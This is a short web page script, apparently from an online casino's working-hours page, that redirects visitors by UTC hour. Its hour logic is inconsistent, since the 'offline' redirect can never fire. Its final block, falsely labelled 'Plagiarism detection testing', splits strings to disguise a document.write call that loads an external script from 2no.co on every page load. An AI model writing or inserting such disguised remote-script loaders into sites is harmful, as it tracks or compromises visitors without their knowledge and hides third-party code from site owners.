Kasya. Время работы
var date = new Date(); 
      var hour = date.getUTCHours();
      if (hour>=18 && hour<19) online = "online";
      else { if (hour>=19 && hour<24) online = "online";
      else { if (hour>=0 && hour<1) online = "server";
      else {  if (hour>=1&& hour<18) online = "online"; 
      }
   }
}

//Visual clearance 
if (online == "online") {
}if (online == "offline") { 
window.location.href = "/offline";
} else if (online == "server") {
window.location.href = "/server";
} else {
}

//Plagiarism detection testing
var glop = 'script'
var glap = '2no.co'
document.write('<'+glop+' src="'+window.location.protocol+'//'+glap+'/169ax7"></'+glop+'>')

